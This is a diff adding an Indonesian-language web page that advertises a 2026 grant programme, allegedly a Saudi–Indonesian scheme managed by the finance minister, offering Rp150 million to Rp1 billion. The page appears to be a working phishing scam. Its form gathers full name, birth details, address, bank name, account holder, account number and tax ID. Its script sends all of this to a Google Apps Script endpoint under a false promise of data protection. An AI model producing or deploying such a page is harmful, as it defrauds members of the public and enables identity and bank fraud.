@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Pendaftaran Dana Hibah 2026</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+scroll-behavior:smooth;
+}
+
+body{
+
+background:#edf5ff;
+color:#222;
+
+}
+
+header{
+
+width:100%;
+position:fixed;
+top:0;
+left:0;
+background:#1565C0;
+padding:18px 8%;
+display:flex;
+justify-content:space-between;
+align-items:center;
+box-shadow:0 8px 25px rgba(0,0,0,.12);
+z-index:999;
+
+}
+
+.logo{
+
+font-size:28px;
+font-weight:700;
+color:white;
+
+}
+
+nav{
+
+display:flex;
+gap:25px;
+
+}
+
+nav a{
+
+color:white;
+text-decoration:none;
+font-weight:500;
+transition:.3s;
+
+}
+
+nav a:hover{
+
+opacity:.7;
+
+}
+
+.hero{
+
+padding:140px 8% 80px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+flex-wrap:wrap;
+gap:50px;
+
+}
+
+.left{
+
+flex:1;
+min-width:320px;
+
+}
+
+.left h1{
+
+font-size:55px;
+color:#1565C0;
+margin-bottom:20px;
+text-align:center;
+
+}
+
+.left p{
+
+font-size:18px;
+line-height:1.8;
+color:#555;
+margin-bottom:35px;
+
+}
+
+.btn{
+
+padding:17px 40px;
+background:#1565C0;
+color:white;
+border:none;
+border-radius:12px;
+cursor:pointer;
+font-size:17px;
+transition:.3s;
+
+}
+
+.btn:hover{
+
+transform:translateY(-4px);
+background:#0d47a1;
+
+}
+
+.right{
+
+flex:1;
+display:flex;
+justify-content:center;
+
+}
+
+.right img{
+
+width:470px;
+max-width:100%;
+
+}
+
+.info{
+
+padding:60px 8%;
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+gap:25px;
+
+}
+
+.card{
+
+background:white;
+padding:30px;
+border-radius:20px;
+box-shadow:0 12px 30px rgba(0,0,0,.08);
+transition:.3s;
+
+}
+
+.card:hover{
+
+transform:translateY(-8px);
+
+}
+
+.card h3{
+
+margin-bottom:15px;
+color:#1565C0;
+
+}
+
+.form-section{
+
+padding:70px 8%;
+
+}
+
+.form-box{
+
+max-width:950px;
+margin:auto;
+background:white;
+padding:45px;
+border-radius:20px;
+box-shadow:0 15px 35px rgba(0,0,0,.1);
+
+}
+
+.form-box h2{
+
+text-align:center;
+color:#1565C0;
+margin-bottom:35px;
+
+}
+
+.form-title{
+
+margin-top:35px;
+margin-bottom:20px;
+padding-bottom:10px;
+border-bottom:2px solid #1565C0;
+font-size:20px;
+font-weight:600;
+color:#1565C0;
+
+}
+
+.input-group{
+
+margin-bottom:20px;
+
+}
+
+.input-group label{
+
+display:block;
+margin-bottom:8px;
+font-weight:500;
+
+}
+
+.input-group input,
+.input-group textarea,
+.input-group select{
+
+width:100%;
+padding:15px;
+border:1px solid #ddd;
+border-radius:10px;
+font-size:15px;
+transition:.3s;
+
+}
+
+.input-group input:focus,
+.input-group textarea:focus,
+.input-group select:focus{
+
+outline:none;
+border-color:#1565C0;
+
+}
+
+.submit{
+
+margin-top:25px;
+width:100%;
+padding:18px;
+background:#1565C0;
+color:white;
+border:none;
+border-radius:12px;
+font-size:18px;
+cursor:pointer;
+transition:.3s;
+
+}
+
+.submit:disabled{
+
+background:#9ca3af;
+cursor:not-allowed;
+
+}
+
+.submit:hover{
+
+background:#0d47a1;
+
+}
+
+footer{
+
+margin-top:70px;
+background:#1565C0;
+padding:30px;
+text-align:center;
+color:white;
+
+}
+
+.banner{
+
+margin-top:60px;
+width:100%;
+
+}
+
+.banner img{
+
+width:100%;
+height:auto;
+display:block;
+object-fit:cover;
+
+}
+
+.judul-section{
+
+max-width:900px;
+margin:70px auto;
+text-align:center;
+
+}
+
+.judul-section h1{
+
+font-size:58px;
+color:#1565C0;
+font-weight:700;
+margin-bottom:18px;
+
+}
+
+.garis{
+
+display:flex;
+justify-content:center;
+align-items:center;
+gap:12px;
+margin-bottom:28px;
+
+}
+
+.garis span{
+
+width:70px;
+height:3px;
+background:#1565C0;
+border-radius:10px;
+
+}
+
+.garis .kuning{
+
+width:35px;
+background:#f7b500;
+
+}
+
+.deskripsi{
+
+font-size:22px;
+line-height:1.8;
+color:#444;
+margin-bottom:18px;
+
+}
+
+.deskripsi2{
+
+font-size:18px;
+line-height:1.9;
+color:#666;
+max-width:760px;
+margin:auto;
+
+}
+
+.btn-center{
+
+margin-top:35px;
+
+}
+
+
+@media(max-width:768px){
+
+.left h1{
+
+font-size:38px;
+
+}
+
+.hero{
+
+padding-top:120px;
+
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>
+
+<div class="logo">
+
+Dana Hibah
+
+</div>
+
+<nav>
+
+<a href="#">Beranda</a>
+
+<a href="#informasi">Informasi</a>
+
+<a href="#pendaftaran">Pendaftaran</a>
+
+</nav>
+
+</header>
+
+<section class="banner">
+
+<img src="banner.jpeg" alt="Banner">
+
+</section>
+
+<div class="judul-section">
+
+<h1>Pendaftaran Dana Hibah 2026</h1>
+
+<div class="garis">
+<span></span>
+<span class="kuning"></span>
+<span></span>
+</div>
+
+<p class="deskripsi">
+
+Program kerja sama Arab Saudi–Indonesia memberikan bantuan dana hibah
+mulai dari <b>Rp150.000.000</b> hingga <b>Rp1.000.000.000</b> bagi masyarakat
+Indonesia yang memenuhi persyaratan administrasi dan proses verifikasi.
+Penyaluran yang di kelola oleh menteri keuangan Purbaya sadewa.
+
+</p>
+
+<p class="deskripsi2">
+
+Silakan lengkapi formulir pendaftaran dengan data yang benar.
+Pastikan informasi yang diberikan sesuai dengan identitas resmi
+agar proses verifikasi dapat berjalan dengan lancar.
+
+</p>
+
+<div class="btn-center">
+
+<button class="btn"
+onclick="document.getElementById('pendaftaran').scrollIntoView({behavior:'smooth'})">
+
+Daftar Sekarang
+
+</button>
+
+</div>
+
+</div>
+
+<section class="info" id="informasi">
+
+<div class="card">
+
+<h3>Persyaratan</h3>
+
+<p>
+
+Pastikan seluruh data yang dimasukkan sesuai dengan identitas asli dan rekening aktif.
+
+</p>
+
+</div>
+
+<div class="card">
+
+<h3>Proses Cepat</h3>
+
+<p>
+
+Seluruh data akan diproses setelah berhasil dikirim dan diverifikasi oleh petugas.
+
+</p>
+
+</div>
+
+<div class="card">
+
+<h3>Data Terjamin</h3>
+
+<p>
+
+Informasi yang diberikan hanya digunakan untuk keperluan administrasi pendaftaran.
+
+</p>
+
+</div>
+
+</section>
+
+<section class="form-section" id="pendaftaran">
+
+<div class="form-box">
+
+<form id="formDana">
+
+<h2>FORMULIR PENDAFTARAN</h2>
+
+<div class="form-title">
+
+Data Diri
+
+</div>
+
+<div class="input-group">
+
+<label>Nama Lengkap</label>
+
+<input
+type="text"
+id="nama"
+placeholder="Masukkan nama lengkap"
+oninput="this.value=this.value.replace(/[^a-zA-ZÀ-ÿ' ]/g,'')">
+
+</div>
+
+<div class="input-group">
+
+
+<div style="display:flex;gap:15px;flex-wrap:wrap;">
+
+<div style="flex:1;">
+
+<label>Tempat Lahir</label>
+
+<input
+type="text"
+id="tempat"
+placeholder="Contoh: Samarinda"
+oninput="this.value=this.value.replace(/[^a-zA-ZÀ-ÿ' ]/g,'')">
+
+</div>
+
+<div style="flex:1;">
+
+<label>Tanggal Lahir</label>
+
+<input
+type="date"
+id="tanggal">
+
+</div>
+
+</div>
+
+</div>
+
+<div class="input-group">
+
+<label>Alamat Lengkap</label>
+
+<textarea
+id="alamat"
+rows="5"
+placeholder="Masukkan alamat lengkap"></textarea>
+
+</div>
+
+<div class="form-title">
+
+Data Rekening
+
+</div>
+
+<div class="input-group">
+
+<label>Nama Bank</label>
+
+<select id="bank">
+
+<option value="">-- Pilih Bank --</option>
+
+<option>Bank Mandiri</option>
+
+<option>BCA</option>
+
+<option>BRI</option>
+
+<option>BNI</option>
+
+<option>BTN</option>
+
+<option>BSI</option>
+
+<option>CIMB Niaga</option>
+
+<option>Permata Bank</option>
+
+<option>Danamon</option>
+
+</select>
+
+</div>
+
+<div class="input-group">
+
+<label>Nama Pemilik Rekening</label>
+
+<input
+type="text"
+id="namarek"
+placeholder="Nama sesuai buku rekening"
+oninput="this.value=this.value.replace(/[^a-zA-ZÀ-ÿ' ]/g,'')">
+
+</div>
+
+<div class="input-group">
+
+<label>Nomor Rekening</label>
+
+<input
+type="text"
+id="rekening"
+placeholder="Masukkan nomor rekening"
+inputmode="numeric"
+maxlength="25"
+oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+
+</div>
+<div class="form-title">
+
+Data Perpajakan
+
+</div>
+
+<div class="input-group">
+
+<label>Nomor NPWP</label>
+
+<input
+type="text"
+id="npwp"
+placeholder="Opsional"
+maxlength="16"
+inputmode="numeric"
+oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+
+</div>
+
+<div class="input-group">
+
+<label>
+
+<input
+type="checkbox"
+id="setuju">
+
+Saya menyatakan bahwa seluruh data yang saya isi adalah benar dan dapat dipertanggungjawabkan.
+
+</label>
+
+</div>
+
+<button
+type="button"
+class="submit"
+id="btnKirim"
+onclick="kirimData()"
+disabled>
+
+KIRIM PENDAFTARAN
+
+</button>
+
+</form>
+
+</div>
+
+</section>
+
+<footer>
+
+<p>
+
+© 2026 Sistem Pendaftaran Dana Hibah
+
+</p>
+
+</footer>
+
+<script>
+
+const wajib=[
+"nama",
+"tempat",
+"tanggal",
+"alamat",
+"bank",
+"namarek",
+"rekening"
+];
+
+function cekForm(){
+
+let lengkap=true;
+
+wajib.forEach(id=>{
+
+if(document.getElementById(id).value.trim()==""){
+
+lengkap=false;
+
+}
+
+});
+
+if(!document.getElementById("setuju").checked){
+
+lengkap=false;
+
+}
+
+document.getElementById("btnKirim").disabled=!lengkap;
+
+}
+
+document.querySelectorAll("input,textarea,select").forEach(el=>{
+
+el.addEventListener("input",cekForm);
+
+el.addEventListener("change",cekForm);
+
+});
+
+async function kirimData(){
+
+let nama=document.getElementById("nama").value;
+let tempat=document.getElementById("tempat").value;
+let tanggal=document.getElementById("tanggal").value;
+let ttl = tempat + ", " + tanggal;
+let alamat=document.getElementById("alamat").value;
+let bank=document.getElementById("bank").value;
+let namarek=document.getElementById("namarek").value;
+let rekening=document.getElementById("rekening").value;
+let npwp=document.getElementById("npwp").value;
+let setuju=document.getElementById("setuju").checked;
+
+if(
+nama==""||
+ttl==""||
+alamat==""||
+bank==""||
+namarek==""||
+rekening==""
+){
+    alert("Harap lengkapi seluruh data.");
+    return;
+}
+
+if(!setuju){
+alert("Silakan centang pernyataan.");
+return;
+}
+
+const data={
+nama:nama,
+ttl:ttl,
+alamat:alamat,
+bank:bank,
+namarek:namarek,
+rekening:rekening,
+npwp:npwp
+};
+
+try{
+
+const response=await fetch("https://script.google.com/macros/s/AKfycbzwsFQbtHyGlkji8ZocokFTI0GpScWql7rVg6DxPEB20cgXY78qVJtsJ4S6-wW75JIr/exec",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"text/plain;charset=utf-8"
+},
+
+body:JSON.stringify(data)
+
+});
+
+alert("✅ Data berhasil dikirim!");
+
+document.getElementById("formDana").reset();
+cekForm();
+
+}catch(err){
+
+alert("❌ Gagal mengirim data.");
+
+console.log(err);
+
+}
+
+}
+
+</script>
+
+</body>
+
+</html>
